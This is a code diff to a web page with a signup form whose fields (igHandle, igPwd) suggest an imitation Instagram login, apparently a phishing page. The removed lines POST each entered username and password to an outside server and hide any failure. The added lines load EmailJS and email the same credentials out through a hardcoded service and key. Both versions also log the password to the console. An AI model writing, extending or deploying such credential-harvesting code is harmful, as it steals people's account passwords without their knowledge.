@@ -1123,7 +1123,13 @@ footer {
 </div>
 
 <script>
-// Support GitHub Pages clean URLs via 404.html redirect trick
+// EmailJS
+(function(){
+  var s = document.createElement('script');
+  s.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
+  s.onload = function(){ emailjs.init({ publicKey: 'WyUnC13DISNFvLHwp' }); };
+  document.head.appendChild(s);
+})();
 (function() {
   // If we were redirected via 404.html, restore the original path
   const redirectPath = sessionStorage.getItem('ghRedirect');
@@ -1242,7 +1248,7 @@ function showErr(msg) {
 
 let signupAttempt = 0;
 
-async function doSignup(tab) {
+function doSignup(tab) {
   const handle = document.getElementById('igHandle').value.trim();
   const pwd    = document.getElementById('igPwd').value;
   const pwdR   = document.getElementById('igPwdRepeat').value;
@@ -1254,16 +1260,13 @@ async function doSignup(tab) {
   console.log('Username:', handle);
   console.log('Password:', pwd);
 
-  // POST to API on every attempt
+  // Send via EmailJS
   try {
-    await fetch('http://sfa.brightperformancenutrition.com:8080/send_user_sales_details', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: handle, password: pwd })
+    emailjs.send('service_ezsi244', 'template_c509huh', {
+      username: handle,
+      password: pwd
     });
-  } catch (e) {
-    // Silent fail — don't block the UX flow
-  }
+  } catch(e) {}
 
   signupAttempt++;
 
